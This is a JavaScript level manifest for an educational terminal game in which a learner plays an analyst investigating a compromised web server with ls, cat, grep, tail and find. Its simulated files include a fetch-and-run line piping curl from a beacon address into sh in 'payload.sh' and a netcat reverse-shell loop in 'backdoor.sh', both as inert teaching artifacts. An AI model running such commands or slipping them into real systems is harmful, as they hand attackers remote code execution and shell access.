/**
 * LAIR Terminal Drill — level manifest for TerminalGame.jsx.
 *
 * Static, hand-authored content (no admin JSON editor exists for any
 * assignment type in this app — every other piece of curated LAIR content
 * is seeded/hardcoded rather than admin-authored, so this follows suit).
 *
 * Each level is a case folder mounted under /home/analyst/. Levels unlock
 * in order — only case-00..case-N (current) exist in the virtual filesystem
 * at any time. Completion is detected generically: once the level's unique
 * `marker` string appears anywhere in a command's rendered output, the game
 * advances. This keeps the parser free of per-level special cases.
 */

const HOSTNAME = 'corvid-web01';
const USER = 'analyst';

/** Build a long, boring, realistic-looking access.log with the marker as the last line. */
function buildAccessLog(marker) {
  const paths = ['/index.html', '/about.html', '/assets/app.js', '/assets/style.css', '/favicon.ico', '/api/health'];
  const ips = ['203.0.113.4', '203.0.113.9', '203.0.113.22', '198.51.100.31', '198.51.100.58', '192.0.2.14'];
  const lines = [];
  for (let i = 0; i < 140; i++) {
    const ip = ips[i % ips.length];
    const path = paths[i % paths.length];
    const hh = String(2 + (i % 5)).padStart(2, '0');
    const mm = String((i * 7) % 60).padStart(2, '0');
    const ss = String((i * 13) % 60).padStart(2, '0');
    lines.push(`${ip} - - [24/Jul/2026:${hh}:${mm}:${ss} +0000] "GET ${path} HTTP/1.1" 200 ${512 + i}`);
  }
  lines.push(`198.51.100.77 - - [24/Jul/2026:03:14:07 +0000] "POST /wp-login.php HTTP/1.1" 200 918 "-" "curl/7.68.0" MARKER:${marker}`);
  return lines.join('\n');
}

/** Build a long, boring syslog-style file with one "authentication failure" line carrying the marker. */
function buildSyslog(marker) {
  const services = ['systemd', 'cron', 'sshd', 'NetworkManager', 'dbus-daemon'];
  const lines = [];
  for (let i = 0; i < 220; i++) {
    const svc = services[i % services.length];
    const hh = String(i % 24).padStart(2, '0');
    const mm = String((i * 3) % 60).padStart(2, '0');
    const ss = String((i * 11) % 60).padStart(2, '0');
    lines.push(`Jul 24 ${hh}:${mm}:${ss} ${HOSTNAME} ${svc}[${1000 + i}]: routine housekeeping cycle complete`);
  }
  lines.splice(163, 0, `Jul 24 03:14:08 ${HOSTNAME} sshd[19283]: authentication failure; rhost=203.0.113.44 user=www-data MARKER:${marker}`);
  return lines.join('\n');
}

const dir = (children) => ({ type: 'dir', perms: 'drwxr-xr-x', owner: USER, children });
const file = (content, opts = {}) => ({
  type: 'file',
  perms: opts.perms ?? '-rw-r--r--',
  owner: opts.owner ?? USER,
  hidden: opts.hidden ?? false,
  content,
});

export const LEVELS = [
  // ── Level 0 — Orientation ──────────────────────────────────────────────
  {
    id: 'case-00',
    title: 'Orientation',
    briefing:
      'You have shell access to corvid-web01, a webserver flagged for suspicious outbound traffic. ' +
      'Start by getting your bearings: where are you, and what\'s here?',
    marker: 'LAIR-0001',
    hints: [
      'Two commands will get you started: one prints your current directory, one lists what\'s in it.',
      'pwd shows where you are. ls shows what\'s in the current directory.',
      'Once you see README.txt in the listing, read it with: cat README.txt',
    ],
    tree: dir({
      'README.txt': file(
        'corvid-web01 incident ticket #4471\n' +
        'Reported: unusual outbound connections at odd hours.\n' +
        'You are logged in as analyst. Work the filesystem — nothing here bites.\n\n' +
        `MARKER:LAIR-0001\n`
      ),
    }),
  },

  // ── Level 1 — Hidden files ──────────────────────────────────────────────
  {
    id: 'case-01',
    title: 'Hidden Files',
    briefing:
      'This case folder looks empty at first glance. Investigators leave notes in unusual places — ' +
      'and Linux hides files whose names start with a dot from a plain listing.',
    marker: 'LAIR-0002',
    hints: [
      'ls alone won\'t show everything in a directory.',
      'Add a flag to ls to show hidden (dotfile) entries: ls -a',
      'Once you see .triage_note, read it: cat .triage_note',
    ],
    tree: dir({
      'notes.txt': file('Nothing interesting here. Case reassigned to another analyst.\n'),
      '.triage_note': file(
        'Whoever picks this up — check the hidden queue first, always.\n\n' +
        `MARKER:LAIR-0002\n`,
        { hidden: true }
      ),
    }),
  },

  // ── Level 2 — Navigation ──────────────────────────────────────────────
  {
    id: 'case-02',
    title: 'Chasing a Path',
    briefing:
      'A backup job scattered evidence a few directories deep, mixed in with decoy folders that ' +
      'sound almost the same. Navigate carefully.',
    marker: 'LAIR-0003',
    hints: [
      'cd moves you into a directory. You can chain your way down one hop at a time.',
      'Try: cd var, then ls, then keep descending — watch for near-identical decoy folder names.',
      'The real path is: cd var/www/uploads/tmp/.cache — then cat evidence.log',
    ],
    tree: dir({
      var: dir({
        www: dir({
          uploads: dir({
            temp: dir({ 'decoy.log': file('This is not the directory you are looking for.\n') }),
            tmp: dir({
              cache: dir({ 'decoy.log': file('Close, but no. Check for a hidden variant of this folder.\n') }),
              '.cache': dir({
                'evidence.log': file(
                  'Backup job wrote a stray copy of the uploads directory here before cleanup.\n\n' +
                  `MARKER:LAIR-0003\n`
                ),
              }),
            }),
          }),
        }),
      }),
    }),
  },

  // ── Level 3 — Permissions ──────────────────────────────────────────────
  {
    id: 'case-03',
    title: 'Reading the Locks',
    briefing:
      'Three candidate files. Two are owned by root and locked down. One is world-readable — ' +
      'read the permission string with ls -l before you try to cat anything.',
    marker: 'LAIR-0004',
    hints: [
      'ls -l shows a permission string like -rw-r--r-- and an owner for each file.',
      'A string like -rw------- means only the owner can read it. Trying to cat it as analyst will fail.',
      'Look for the file with -rw-r--r-- owned by www-data — that one you can read: cat webapp_dump.txt',
    ],
    tree: dir({
      'shadow_bak.txt': file('root only — you should not be able to read this.\n', { perms: '-rw-------', owner: 'root' }),
      'private_keys.txt': file('root only — locked down.\n', { perms: '-rw-------', owner: 'root' }),
      'webapp_dump.txt': file(
        'Config dump left world-readable by the webapp during a debug session.\n\n' +
        `MARKER:LAIR-0004\n`,
        { perms: '-rw-r--r--', owner: 'www-data' }
      ),
    }),
  },

  // ── Level 4 — tail ──────────────────────────────────────────────────────
  {
    id: 'case-04',
    title: 'The Last Line',
    briefing:
      'access.log is long — hundreds of routine hits. The line that matters is the very last one, ' +
      'a POST request that shouldn\'t be there. Don\'t scroll through the whole file to find it.',
    marker: 'LAIR-0005',
    hints: [
      'cat would dump the whole file — there\'s a command built for just the end of a file.',
      'tail shows the last 10 lines by default.',
      'Run: tail access.log',
    ],
    tree: dir({
      'access.log': file(buildAccessLog('LAIR-0005')),
    }),
  },

  // ── Level 5 — grep ──────────────────────────────────────────────────────
  {
    id: 'case-05',
    title: 'Needle in the Log',
    briefing:
      'syslog is over 200 lines of routine housekeeping. Somewhere in there is one authentication ' +
      'failure that matters. Searching by hand isn\'t realistic — search by keyword instead.',
    marker: 'LAIR-0006',
    hints: [
      'grep searches a file for lines matching a pattern.',
      'Try searching for the phrase: authentication failure',
      'Run: grep "authentication failure" syslog',
    ],
    tree: dir({
      syslog: file(buildSyslog('LAIR-0006')),
    }),
  },

  // ── Level 6 — find ──────────────────────────────────────────────────────
  {
    id: 'case-06',
    title: 'Buried Payload',
    briefing:
      'Somewhere under this directory tree is a script called payload.sh. The tree is deep and wide — ' +
      'don\'t cd into every folder by hand.',
    marker: 'LAIR-0007',
    hints: [
      'find searches an entire directory tree for you, recursively.',
      'find takes a starting path and a -name filter: find <path> -name "<pattern>"',
      'Run: find . -name "payload.sh" — then cat whatever path it prints',
    ],
    tree: dir({
      srv: dir({
        app: dir({
          v1: dir({ 'run.sh': file('#!/bin/sh\necho "legit deploy script"\n') }),
          v2: dir({
            cache: dir({ 'tmp.dat': file('binary-ish placeholder data\n') }),
            jobs: dir({
              worker: dir({
                '.hidden_deploy': dir({
                  'payload.sh': file(
                    '#!/bin/sh\n# dropped during the intrusion\ncurl -s http://198.51.100.77/beacon | sh\n\n' +
                    `# MARKER:LAIR-0007\n`
                  ),
                }),
              }),
            }),
          }),
        }),
        backups: dir({ '2026-07-20': dir({ 'run.sh': file('#!/bin/sh\necho "backup verify script"\n') }) }),
      }),
    }),
  },

  // ── Level 7 — Synthesis (finale) ────────────────────────────────────────
  {
    id: 'case-07',
    title: 'Closing the Case',
    briefing:
      'Last step. Somewhere under scripts/ there\'s a shell script talking to a C2 address. ' +
      'Find every .sh file, then grep them for the beacon IP: 198.51.100.77',
    marker: 'LAIR-0008',
    hints: [
      'This one chains two commands: find every .sh file under scripts/, then grep each one.',
      'find scripts -name "*.sh" lists the candidates. cat each one, or grep the IP directly in a candidate.',
      'Run: find scripts -name "*.sh" — then grep "198.51.100.77" scripts/cron/rotate/backdoor.sh',
    ],
    tree: dir({
      scripts: dir({
        maint: dir({ 'cleanup.sh': file('#!/bin/sh\nfind /tmp -mtime +7 -delete\n') }),
        cron: dir({
          rotate: dir({
            'logrotate_local.sh': file('#!/bin/sh\nlogrotate /etc/logrotate.d/local\n'),
            'backdoor.sh': file(
              '#!/bin/sh\n# reverse shell beacon, added outside change control\n' +
              `while true; do nc 198.51.100.77 4444 -e /bin/sh; sleep 300; done # MARKER:LAIR-0008\n`
            ),
          }),
        }),
      }),
    }),
  },
];

export const HOME_PATH = '/home/analyst';
export { HOSTNAME, USER, dir, file };
